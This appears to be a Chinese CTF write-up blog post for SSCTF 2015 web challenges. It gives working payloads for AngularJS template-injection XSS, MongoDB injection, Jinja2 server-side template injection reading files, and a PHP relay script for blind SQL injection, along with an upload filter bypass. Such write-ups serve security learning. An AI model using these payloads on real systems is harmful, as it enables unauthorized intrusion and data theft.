title: ssctf2015_writeup
date: 2016-03-01 12:40:12
tags:
- Blogs
- ctf
categories:
- Blogs
---

刚开学没什么事打了2月2728的ssctf，结果被web刷的一愣一愣的，看了出来的writeup才感觉是点儿蛋疼的，整理下writeup看看...

<!--more-->

# WEB

## web1 Up!Up!Up!(文件上传)

![](/img/ssctf/web1.png)

看了出来的writeup，我才第一次知道上传过滤还能这么写。。。
原洞是来自[http://www.wooyun.org/bugs/wooyun-2015-0125982](http://www.wooyun.org/bugs/wooyun-2015-0125982)

看着真的是叼，把那个content-type大小写改下就过了...
![](/img/ssctf/web1_1.png)

## Can You Hit Me？（augularjs xss）
![](/img/ssctf/web2.png)
打开是这样的：
![](/img/ssctf/web2_1.png)

稍微测试下发现对script,alert,on的过滤都是替换一次，甚至大小写都没有过滤，有点儿傻的，但是却把<这样的替换为_，于是想了一天也没想明白怎么过。

找到一篇博客[http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)

结果发现augularjs可以不需要尖括号，找到一个payload：
```
{{
'a'.constructor.prototype.charAt=[].join;
eval('x=1} } };alert(1)//');
}}
```
稍微改下
```
xss={{%27a%27.coonnstructor.prototype.charAt=[].join;$evevalal(%22m=1)%20}%20};alalertert(123)//%22};}}
```

##  Legend？Legend！(mongdb注入)
![](/img/ssctf/web3.png)
测试下发现sql注不动，那么估计就是mongdb了，那么又是这篇文章了：
[http://drops.wooyun.org/tips/3939](http://drops.wooyun.org/tips/3939)
payload:
```
5%27});return%20{title:tojson(db.user.find()[0])}//
```
注到一个user数据，登陆下，找找就能找到flag了。

##  Flag-Man
![](/img/ssctf/web4.png)
从这里就没点开看了，那么就先贴上别人的writeup吧。

登录github授权，然后发现在Your Profile中的Name是控制/users中的name

Name是可控制的,遍历目录 最后读取文件 得到flag
[http://drops.wooyun.org/web/13057](http://drops.wooyun.org/web/13057)

payload:
```
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__ == 'catch_warnings'%}{{c.__init__.func_globals['linecache'].__dict__['__builtins__'].open('ssctf.py').read()}}{%endif%}{%endfor%}
```
访问user目录get flag

##  AFSRC-Market
![](/img/ssctf/web5.png)

 注入在add_cart.php页面，提交id=xxx  cost为0 判断有注入，但是不能直接得到数据。于是中转注入

```
 $opts = array ('http' => array ('header'=>'Cookie: PHPSESSID=1;'));
$context = stream_context_create($opts);
$html = file_get_contents('http://edb24e7c.seclover.com/add_cart.php?id=0x'.bin2hex($_GET[x]), false, $context);
$html = file_get_contents('http://edb24e7c.seclover.com/userinfo.php', false, $context);
preg_match('/cost: (.*?)<\/p>/is',$html,$res);
echo $res[1]==0 ? 0 : 1;
```
得到提示
![](/img/ssctf/web5_1.png)
到这里就跑吧，爆破salt。
